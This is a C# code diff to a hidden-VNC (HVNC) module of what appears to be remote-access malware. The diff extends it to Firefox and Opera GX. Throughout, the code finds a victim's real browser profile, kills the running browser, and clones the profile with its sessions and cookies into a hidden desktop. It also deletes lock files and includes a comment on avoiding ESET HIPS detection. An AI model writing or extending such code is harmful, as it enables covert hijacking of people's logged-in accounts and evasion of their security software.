@@ -390,10 +390,12 @@ internal static class HvncFeature
         // TerminateProcess on a browser looks like a crash to ESET HIPS, which then blocks the
         // browser's profile directory on the next real-desktop launch.
         const uint PT = 0x0001; // PROCESS_TERMINATE
-        bool launchedOpera  = _launchedPids.ContainsKey("opera.exe");
-        bool launchedEdge   = _launchedPids.ContainsKey("msedge.exe");
-        bool launchedChrome = _launchedPids.ContainsKey("chrome.exe");
-        bool launchedBrave  = _launchedPids.ContainsKey("brave.exe");
+        bool launchedOpera   = _launchedPids.ContainsKey("opera.exe");
+        bool launchedOperaGX = _launchedPids.ContainsKey("operagx.exe");
+        bool launchedEdge    = _launchedPids.ContainsKey("msedge.exe");
+        bool launchedChrome  = _launchedPids.ContainsKey("chrome.exe");
+        bool launchedBrave   = _launchedPids.ContainsKey("brave.exe");
+        bool launchedFirefox = _launchedPids.ContainsKey("firefox.exe");
         GracefulKillBrowsers();
         foreach (var pid in _launchedPids.Values)
         {
@@ -409,10 +411,11 @@ internal static class HvncFeature
         CleanChromiumHvncLocks();
 
         // Repair real Opera profile: fix wrong path bug + repair corrupted JSON files.
-        if (launchedOpera)  RepairOperaProfileAfterHvnc();
-        if (launchedEdge)   CleanRealBrowserLock("Microsoft",   "Edge",             "User Data");
-        if (launchedChrome) CleanRealBrowserLock("Google",      "Chrome",           "User Data");
-        if (launchedBrave)  CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data");
+        if (launchedOpera || launchedOperaGX) RepairOperaProfileAfterHvnc();
+        if (launchedEdge)    CleanRealBrowserLock("Microsoft",    "Edge",            "User Data");
+        if (launchedChrome)  CleanRealBrowserLock("Google",       "Chrome",          "User Data");
+        if (launchedBrave)   CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data");
+        if (launchedFirefox) CleanFirefoxRealLocks();
     }
 
     public static void SignalAck()
@@ -1625,6 +1628,52 @@ internal static class HvncFeature
         }
     }
 
+    private static string? GetFirefoxRealProfile()
+    {
+        string ffBase = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+            "Mozilla", "Firefox");
+        string iniPath = Path.Combine(ffBase, "profiles.ini");
+        if (!File.Exists(iniPath)) return null;
+
+        string? bestPath    = null;
+        string? currentPath = null;
+        bool    isRelative  = true;
+        bool    isDefault   = false;
+
+        void Commit()
+        {
+            if (currentPath == null) return;
+            string full = isRelative
+                ? Path.Combine(ffBase, currentPath.Replace('/', Path.DirectorySeparatorChar))
+                : currentPath;
+            if (bestPath == null || isDefault) bestPath = full;
+        }
+
+        foreach (var line in File.ReadLines(iniPath))
+        {
+            string t = line.Trim();
+            if (t.StartsWith('['))
+            {
+                Commit(); currentPath = null; isRelative = true; isDefault = false;
+            }
+            else if (t.StartsWith("Path=",       StringComparison.OrdinalIgnoreCase)) currentPath = t[5..];
+            else if (t.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase)) isRelative  = t[11..].Trim() == "1";
+            else if (t.Equals(    "Default=1",   StringComparison.OrdinalIgnoreCase)) isDefault   = true;
+        }
+        Commit();
+
+        return bestPath != null && Directory.Exists(bestPath) ? bestPath : null;
+    }
+
+    private static void CleanFirefoxRealLocks()
+    {
+        string? p = GetFirefoxRealProfile();
+        if (p == null) return;
+        foreach (var lk in new[] { "parent.lock", "lock" })
+            try { File.Delete(Path.Combine(p, lk)); } catch { }
+    }
+
     private static void KillProcessByName(string exeName)
     {
         const uint TH32CS_SNAPPROCESS = 0x00000002;
@@ -1839,14 +1888,24 @@ internal static class HvncFeature
                 cmd = path.Contains(' ') ? $"\"{path}\"" : path;
             }
 
+            // Separate PID key so Opera GX ("operagx.exe") doesn't collide with Opera ("opera.exe")
+            string pidKey = exeBase;
+
             if (_chromiumBrowsers.Contains(exeBase))
             {
-                string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc",
-                    Path.GetFileNameWithoutExtension(exeBase));
-                string? realProfile = GetChromiumRealProfile(exeBase);
+                bool isOperaGX = exeBase == "opera.exe" &&
+                                 path.IndexOf("Opera GX", StringComparison.OrdinalIgnoreCase) >= 0;
+                if (isOperaGX) pidKey = "operagx.exe";
+
+                string hvncDirName = isOperaGX ? "operagx" : Path.GetFileNameWithoutExtension(exeBase);
+                string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc", hvncDirName);
+
+                string? realProfile = isOperaGX
+                    ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                                   "Opera Software", "Opera GX Stable")
+                    : GetChromiumRealProfile(exeBase);
                 if (realProfile != null && Directory.Exists(realProfile))
                 {
-                    // Kill real instance to release file locks, then clone fresh profile
                     KillProcessByName(exeBase);
                     Thread.Sleep(500);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
@@ -1881,8 +1940,34 @@ internal static class HvncFeature
                 // Both share %APPDATA%\Telegram Desktop\ → HVNC instance inherits user theme (dark mode).
                 cmd += " -many";
             }
-            // Repair real Opera profile JSON before launch (registry ATTEMPTS counter + corrupted JSON).
-            // The HVNC temp profile is always re-cloned fresh above, so this only touches the real profile.
+            else if (exeBase == "firefox.exe")
+            {
+                string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc", "firefox");
+                string? realProfile = GetFirefoxRealProfile();
+                if (realProfile != null && Directory.Exists(realProfile))
+                {
+                    KillProcessByName("firefox.exe");
+                    Thread.Sleep(500);
+                    try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, true); } catch { }
+                    CloneProfileToDir(realProfile, hvncProfile);
+                    StubLog.Info($"[HVNC] Firefox profile cloned '{realProfile}' → '{hvncProfile}'");
+                }
+                else
+                {
+                    try { Directory.CreateDirectory(hvncProfile); } catch { }
+                }
+                foreach (var lk in new[] { "parent.lock", "lock" })
+                    try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
+                // Replace existing -profile flag in cmd (server sends one pointing to old temp dir)
+                int pIdx = cmd.IndexOf("-profile ", StringComparison.OrdinalIgnoreCase);
+                if (pIdx >= 0)
+                {
+                    int eIdx = cmd.IndexOf(" -", pIdx + 9);
+                    cmd = (eIdx >= 0 ? cmd[..pIdx] + cmd[eIdx..] : cmd[..pIdx]).TrimEnd();
+                }
+                cmd += $" -profile \"{hvncProfile}\" -no-remote";
+            }
+            // Repair real Opera / Opera GX profile JSON before launch.
             if (exeBase == "opera.exe") RepairOperaProfileAfterHvnc();
 
             var sb = new System.Text.StringBuilder(cmd);
@@ -1898,7 +1983,7 @@ internal static class HvncFeature
             if (envBlock    != 0) DestroyEnvironmentBlock(envBlock);
             if (launchToken != 0) CloseHandle(launchToken);
             StubLog.Info($"[HVNC] LaunchOnDesktop '{path}' pid={pi.dwProcessId}");
-            if (pi.dwProcessId != 0) _launchedPids[exeBase] = pi.dwProcessId;
+            if (pi.dwProcessId != 0) _launchedPids[pidKey] = pi.dwProcessId;
             if (pi.dwProcessId != 0 && exeBase == "opera.exe")    PatchCursorInfoAsync(pi.dwProcessId);
             if (pi.dwProcessId != 0 && exeBase == "explorer.exe") SuppressMscoriesAsync(pi.dwProcessId);
             // If Edge or Explorer exits within 3 s (failed startup), retry once automatically.
